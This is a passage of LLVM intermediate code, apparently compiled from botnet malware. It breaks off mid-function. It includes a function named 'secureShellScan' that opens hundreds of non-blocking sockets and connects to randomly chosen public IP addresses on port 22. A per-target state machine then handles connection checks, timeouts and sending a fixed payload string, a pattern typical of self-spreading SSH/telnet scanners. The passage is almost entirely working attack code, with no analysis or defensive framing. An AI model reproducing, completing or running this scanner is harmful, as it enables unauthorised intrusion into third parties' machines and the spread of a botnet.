  %1972 = sext i32 %1971 to i64
  %1973 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1972
  %1974 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1973, i32 0, i32 3
  store i8 1, i8* %1974, align 1
  br label %2047

; <label>:1975:                                   ; preds = %1952
  %1976 = load i32, i32* %2, align 4
  %1977 = sext i32 %1976 to i64
  %1978 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1977
  %1979 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1978, i32 0, i32 2
  store i8 8, i8* %1979, align 8
  br label %2046

; <label>:1980:                                   ; preds = %68
  %1981 = load i32, i32* %2, align 4
  %1982 = sext i32 %1981 to i64
  %1983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1982
  %1984 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1983, i32 0, i32 6
  %1985 = load i32, i32* %1984, align 4
  %1986 = icmp eq i32 %1985, 0
  br i1 %1986, label %1987, label %1993

; <label>:1987:                                   ; preds = %1980
  %1988 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1989 = load i32, i32* %2, align 4
  %1990 = sext i32 %1989 to i64
  %1991 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1990
  %1992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1991, i32 0, i32 6
  store i32 %1988, i32* %1992, align 4
  br label %1993

; <label>:1993:                                   ; preds = %1987, %1980
  %1994 = load i32, i32* %2, align 4
  %1995 = sext i32 %1994 to i64
  %1996 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %1995
  %1997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1996, i32 0, i32 0
  %1998 = load i32, i32* %1997, align 16
  %1999 = call i64 @send(i32 %1998, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i32 0, i32 0), i64 194, i32 16384)
  %2000 = icmp slt i64 %1999, 0
  br i1 %2000, label %2001, label %2021

; <label>:2001:                                   ; preds = %1993
  %2002 = load i32, i32* %2, align 4
  %2003 = sext i32 %2002 to i64
  %2004 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2003
  %2005 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2004, i32 0, i32 0
  %2006 = load i32, i32* %2005, align 16
  %2007 = call i32 @sclose(i32 %2006)
  %2008 = load i32, i32* %2, align 4
  %2009 = sext i32 %2008 to i64
  %2010 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2009
  %2011 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2010, i32 0, i32 2
  store i8 0, i8* %2011, align 8
  %2012 = load i32, i32* %2, align 4
  %2013 = sext i32 %2012 to i64
  %2014 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2013
  %2015 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2014, i32 0, i32 3
  store i8 1, i8* %2015, align 1
  %2016 = load i32, i32* %2, align 4
  %2017 = sext i32 %2016 to i64
  %2018 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2017
  %2019 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2018, i32 0, i32 8
  %2020 = load i8*, i8** %2019, align 8
  call void @llvm.memset.p0i8.i64(i8* %2020, i8 0, i64 1024, i32 1, i1 false)
  br label %2047

; <label>:2021:                                   ; preds = %1993
  %2022 = load i32, i32* %2, align 4
  %2023 = sext i32 %2022 to i64
  %2024 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2023
  %2025 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2024, i32 0, i32 6
  %2026 = load i32, i32* %2025, align 4
  %2027 = add i32 %2026, 10
  %2028 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2029 = icmp ult i32 %2027, %2028
  br i1 %2029, label %2030, label %2045

; <label>:2030:                                   ; preds = %2021
  %2031 = load i32, i32* %2, align 4
  %2032 = sext i32 %2031 to i64
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2032
  %2034 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2033, i32 0, i32 0
  %2035 = load i32, i32* %2034, align 16
  %2036 = call i32 @sclose(i32 %2035)
  %2037 = load i32, i32* %2, align 4
  %2038 = sext i32 %2037 to i64
  %2039 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2038
  %2040 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2039, i32 0, i32 2
  store i8 0, i8* %2040, align 8
  %2041 = load i32, i32* %2, align 4
  %2042 = sext i32 %2041 to i64
  %2043 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %2042
  %2044 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2043, i32 0, i32 3
  store i8 1, i8* %2044, align 1
  br label %2045

; <label>:2045:                                   ; preds = %2030, %2021
  br label %2046

; <label>:2046:                                   ; preds = %2045, %1975, %1951, %1138, %1074, %726, %662, %373, %217, %68
  br label %2047

; <label>:2047:                                   ; preds = %2046, %2001, %1960, %1902, %1877, %1849, %1808, %1783, %1755, %1714, %1689, %1661, %1620, %1595, %1567, %1526, %1501, %1473, %1432, %1407, %1379, %1338, %1313, %1285, %1244, %1219, %1191, %1123, %1100, %1015, %992, %969, %946, %923, %900, %877, %854, %840, %789, %711, %688, %604, %575, %512, %483, %432, %298, %170, %140
  %2048 = load i32, i32* %2, align 4
  %2049 = add nsw i32 %2048, 1
  store i32 %2049, i32* %2, align 4
  br label %64

; <label>:2050:                                   ; preds = %64
  br label %62
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @secureShellScan() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i8*, align 8
  %10 = alloca %struct.timeval, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = call i32 @getdtablesize() #2
  %15 = sdiv i32 %14, 4
  %16 = mul nsw i32 %15, 3
  store i32 %16, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = icmp sgt i32 %17, 512
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %0
  br label %22

; <label>:20:                                     ; preds = %0
  %21 = load i32, i32* %1, align 4
  br label %22

; <label>:22:                                     ; preds = %20, %19
  %23 = phi i32 [ 512, %19 ], [ %21, %20 ]
  store i32 %23, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 22) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  %33 = bitcast %struct.telstate_t* %32 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  br label %37

; <label>:37:                                     ; preds = %56, %22
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %59

; <label>:41:                                     ; preds = %37
  %42 = load i32, i32* %2, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %43
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %44, i32 0, i32 3
  store i8 1, i8* %45, align 1
  %46 = call noalias i8* @malloc(i64 1024) #2
  %47 = load i32, i32* %2, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %48
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %49, i32 0, i32 8
  store i8* %46, i8** %50, align 8
  %51 = load i32, i32* %2, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %52
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %53, i32 0, i32 8
  %55 = load i8*, i8** %54, align 8
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 1024, i32 1, i1 false)
  br label %56

; <label>:56:                                     ; preds = %41
  %57 = load i32, i32* %2, align 4
  %58 = add nsw i32 %57, 1
  store i32 %58, i32* %2, align 4
  br label %37

; <label>:59:                                     ; preds = %37
  %60 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 8, i64* %60, align 8
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %61, align 8
  br label %62

; <label>:62:                                     ; preds = %1946, %59
  br label %63

; <label>:63:                                     ; preds = %62
  store i32 0, i32* %2, align 4
  br label %64

; <label>:64:                                     ; preds = %1943, %63
  %65 = load i32, i32* %2, align 4
  %66 = load i32, i32* %1, align 4
  %67 = icmp slt i32 %65, %66
  br i1 %67, label %68, label %1946

; <label>:68:                                     ; preds = %64
  %69 = load i32, i32* %2, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %70
  %72 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %71, i32 0, i32 2
  %73 = load i8, i8* %72, align 8
  %74 = zext i8 %73 to i32
  switch i32 %74, label %1942 [
    i32 0, label %75
    i32 1, label %218
    i32 2, label %374
    i32 3, label %531
    i32 4, label %599
    i32 5, label %943
    i32 6, label %1011
    i32 7, label %1820
    i32 8, label %1848
    i32 9, label %1876
  ]

; <label>:75:                                     ; preds = %68
  %76 = load i32, i32* %2, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %77
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %78, i32 0, i32 8
  %80 = load i8*, i8** %79, align 8
  call void @llvm.memset.p0i8.i64(i8* %80, i8 0, i64 1024, i32 1, i1 false)
  %81 = load i32, i32* %2, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %82
  %84 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %83, i32 0, i32 3
  %85 = load i8, i8* %84, align 1
  %86 = icmp ne i8 %85, 0
  br i1 %86, label %87, label %107

; <label>:87:                                     ; preds = %75
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  store i8* %92, i8** %11, align 8
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %94
  %96 = bitcast %struct.telstate_t* %95 to i8*
  call void @llvm.memset.p0i8.i64(i8* %96, i8 0, i64 32, i32 16, i1 false)
  %97 = load i8*, i8** %11, align 8
  %98 = load i32, i32* %2, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %99
  %101 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %100, i32 0, i32 8
  store i8* %97, i8** %101, align 8
  %102 = call i32 @getRandomPublicIP()
  %103 = load i32, i32* %2, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %104
  %106 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %105, i32 0, i32 1
  store i32 %102, i32* %106, align 4
  br label %146

; <label>:107:                                    ; preds = %75
  %108 = load i32, i32* %2, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %109
  %111 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %110, i32 0, i32 5
  %112 = load i8, i8* %111, align 1
  %113 = add i8 %112, 1
  store i8 %113, i8* %111, align 1
  %114 = load i32, i32* %2, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %115
  %117 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %116, i32 0, i32 5
  %118 = load i8, i8* %117, align 1
  %119 = zext i8 %118 to i64
  %120 = icmp eq i64 %119, 18
  br i1 %120, label %121, label %132

; <label>:121:                                    ; preds = %107
  %122 = load i32, i32* %2, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %123
  %125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %124, i32 0, i32 5
  store i8 0, i8* %125, align 1
  %126 = load i32, i32* %2, align 4
  %127 = sext i32 %126 to i64
  %128 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %127
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %128, i32 0, i32 4
  %130 = load i8, i8* %129, align 2
  %131 = add i8 %130, 1
  store i8 %131, i8* %129, align 2
  br label %132

; <label>:132:                                    ; preds = %121, %107
  %133 = load i32, i32* %2, align 4
  %134 = sext i32 %133 to i64
  %135 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %134
  %136 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %135, i32 0, i32 4
  %137 = load i8, i8* %136, align 2
  %138 = zext i8 %137 to i64
  %139 = icmp eq i64 %138, 10
  br i1 %139, label %140, label %145

; <label>:140:                                    ; preds = %132
  %141 = load i32, i32* %2, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %142
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %143, i32 0, i32 3
  store i8 1, i8* %144, align 1
  br label %1943

; <label>:145:                                    ; preds = %132
  br label %146

; <label>:146:                                    ; preds = %145, %87
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %147, align 4
  %148 = call zeroext i16 @htons(i16 zeroext 22) #13
  %149 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %148, i16* %149, align 2
  %150 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %151 = getelementptr inbounds [8 x i8], [8 x i8]* %150, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %151, i8 0, i64 8, i32 4, i1 false)
  %152 = load i32, i32* %2, align 4
  %153 = sext i32 %152 to i64
  %154 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %153
  %155 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %154, i32 0, i32 1
  %156 = load i32, i32* %155, align 4
  %157 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %158 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %157, i32 0, i32 0
  store i32 %156, i32* %158, align 4
  %159 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %160 = load i32, i32* %2, align 4
  %161 = sext i32 %160 to i64
  %162 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %161
  %163 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %162, i32 0, i32 0
  store i32 %159, i32* %163, align 16
  %164 = load i32, i32* %2, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 0
  %168 = load i32, i32* %167, align 16
  %169 = icmp eq i32 %168, -1
  br i1 %169, label %170, label %171

; <label>:170:                                    ; preds = %146
  br label %1943

; <label>:171:                                    ; preds = %146
  %172 = load i32, i32* %2, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %173
  %175 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %174, i32 0, i32 0
  %176 = load i32, i32* %175, align 16
  %177 = load i32, i32* %2, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %178
  %180 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 16
  %182 = call i32 (i32, i32, ...) @fcntl(i32 %181, i32 3, i8* null)
  %183 = or i32 %182, 2048
  %184 = call i32 (i32, i32, ...) @fcntl(i32 %176, i32 4, i32 %183)
  %185 = load i32, i32* %2, align 4
  %186 = sext i32 %185 to i64
  %187 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %186
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %187, i32 0, i32 0
  %189 = load i32, i32* %188, align 16
  %190 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %191 = call i32 @connect(i32 %189, %struct.sockaddr* %190, i32 16)
  %192 = icmp eq i32 %191, -1
  br i1 %192, label %193, label %208

; <label>:193:                                    ; preds = %171
  %194 = call i32* @__errno_location() #13
  %195 = load i32, i32* %194, align 4
  %196 = icmp ne i32 %195, 115
  br i1 %196, label %197, label %208

; <label>:197:                                    ; preds = %193
  %198 = load i32, i32* %2, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %199
  %201 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %200, i32 0, i32 0
  %202 = load i32, i32* %201, align 16
  %203 = call i32 @sclose(i32 %202)
  %204 = load i32, i32* %2, align 4
  %205 = sext i32 %204 to i64
  %206 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %205
  %207 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %206, i32 0, i32 3
  store i8 1, i8* %207, align 1
  br label %217

; <label>:208:                                    ; preds = %193, %171
  %209 = load i32, i32* %2, align 4
  %210 = sext i32 %209 to i64
  %211 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %210
  %212 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %211, i32 0, i32 2
  store i8 1, i8* %212, align 8
  %213 = load i32, i32* %2, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %214
  %216 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %215, i32 0, i32 6
  store i32 0, i32* %216, align 4
  br label %217

; <label>:217:                                    ; preds = %208, %197
  br label %1942

; <label>:218:                                    ; preds = %68
  %219 = load i32, i32* %2, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %220
  %222 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %221, i32 0, i32 6
  %223 = load i32, i32* %222, align 4
  %224 = icmp eq i32 %223, 0
  br i1 %224, label %225, label %231

; <label>:225:                                    ; preds = %218
  %226 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %227 = load i32, i32* %2, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %228
  %230 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %229, i32 0, i32 6
  store i32 %226, i32* %230, align 4
  br label %231

; <label>:231:                                    ; preds = %225, %218
  br label %232

; <label>:232:                                    ; preds = %231
  %233 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %234 = getelementptr inbounds [16 x i64], [16 x i64]* %233, i64 0, i64 0
  %235 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %234) #2, !srcloc !6
  %236 = extractvalue { i64, i64* } %235, 0
  %237 = extractvalue { i64, i64* } %235, 1
  %238 = trunc i64 %236 to i32
  store i32 %238, i32* %12, align 4
  %239 = ptrtoint i64* %237 to i64
  %240 = trunc i64 %239 to i32
  store i32 %240, i32* %13, align 4
  br label %241

; <label>:241:                                    ; preds = %232
  br label %242

; <label>:242:                                    ; preds = %241
  %243 = load i32, i32* %2, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %244
  %246 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 16
  %248 = srem i32 %247, 64
  %249 = zext i32 %248 to i64
  %250 = shl i64 1, %249
  %251 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %252 = load i32, i32* %2, align 4
  %253 = sext i32 %252 to i64
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %253
  %255 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %254, i32 0, i32 0
  %256 = load i32, i32* %255, align 16
  %257 = sdiv i32 %256, 64
  %258 = sext i32 %257 to i64
  %259 = getelementptr inbounds [16 x i64], [16 x i64]* %251, i64 0, i64 %258
  %260 = load i64, i64* %259, align 8
  %261 = or i64 %260, %250
  store i64 %261, i64* %259, align 8
  %262 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %262, align 8
  %263 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %263, align 8
  %264 = load i32, i32* %2, align 4
  %265 = sext i32 %264 to i64
  %266 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %265
  %267 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %266, i32 0, i32 0
  %268 = load i32, i32* %267, align 16
  %269 = add nsw i32 %268, 1
  %270 = call i32 @select(i32 %269, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %270, i32* %3, align 4
  %271 = load i32, i32* %3, align 4
  %272 = icmp eq i32 %271, 1
  br i1 %272, label %273, label %330

; <label>:273:                                    ; preds = %242
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %274 = load i32, i32* %2, align 4
  %275 = sext i32 %274 to i64
  %276 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %275
  %277 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %276, i32 0, i32 0
  %278 = load i32, i32* %277, align 16
  %279 = bitcast i32* %7 to i8*
  %280 = call i32 @getsockopt(i32 %278, i32 1, i32 4, i8* %279, i32* %6) #2
  %281 = load i32, i32* %7, align 4
  %282 = icmp ne i32 %281, 0
  br i1 %282, label %283, label %298

; <label>:283:                                    ; preds = %273
  %284 = load i32, i32* %2, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = call i32 @sclose(i32 %288)
  %290 = load i32, i32* %2, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 2
  store i8 0, i8* %293, align 8
  %294 = load i32, i32* %2, align 4
  %295 = sext i32 %294 to i64
  %296 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %295
  %297 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %296, i32 0, i32 3
  store i8 1, i8* %297, align 1
  br label %329

; <label>:298:                                    ; preds = %273
  %299 = load i32, i32* %2, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 0
  %303 = load i32, i32* %302, align 16
  %304 = load i32, i32* %2, align 4
  %305 = sext i32 %304 to i64
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %305
  %307 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %306, i32 0, i32 0
  %308 = load i32, i32* %307, align 16
  %309 = call i32 (i32, i32, ...) @fcntl(i32 %308, i32 3, i8* null)
  %310 = and i32 %309, -2049
  %311 = call i32 (i32, i32, ...) @fcntl(i32 %303, i32 4, i32 %310)
  %312 = load i32, i32* %2, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %313
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %314, i32 0, i32 6
  store i32 0, i32* %315, align 4
  %316 = load i32, i32* %2, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 7
  store i16 0, i16* %319, align 16
  %320 = load i32, i32* %2, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %321
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %322, i32 0, i32 8
  %324 = load i8*, i8** %323, align 8
  call void @llvm.memset.p0i8.i64(i8* %324, i8 0, i64 1024, i32 1, i1 false)
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 2
  store i8 2, i8* %328, align 8
  br label %1943

; <label>:329:                                    ; preds = %283
  br label %349

; <label>:330:                                    ; preds = %242
  %331 = load i32, i32* %3, align 4
  %332 = icmp eq i32 %331, -1
  br i1 %332, label %333, label %348

; <label>:333:                                    ; preds = %330
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = call i32 @sclose(i32 %338)
  %340 = load i32, i32* %2, align 4
  %341 = sext i32 %340 to i64
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %341
  %343 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %342, i32 0, i32 2
  store i8 0, i8* %343, align 8
  %344 = load i32, i32* %2, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %345
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %346, i32 0, i32 3
  store i8 1, i8* %347, align 1
  br label %348

; <label>:348:                                    ; preds = %333, %330
  br label %349

; <label>:349:                                    ; preds = %348, %329
  %350 = load i32, i32* %2, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 6
  %354 = load i32, i32* %353, align 4
  %355 = add i32 %354, 10
  %356 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %357 = icmp ult i32 %355, %356
  br i1 %357, label %358, label %373

; <label>:358:                                    ; preds = %349
  %359 = load i32, i32* %2, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %360
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %361, i32 0, i32 0
  %363 = load i32, i32* %362, align 16
  %364 = call i32 @sclose(i32 %363)
  %365 = load i32, i32* %2, align 4
  %366 = sext i32 %365 to i64
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %366
  %368 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %367, i32 0, i32 2
  store i8 0, i8* %368, align 8
  %369 = load i32, i32* %2, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %32, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 3
  store i8 1, i8* %372, align 1
  br label %373

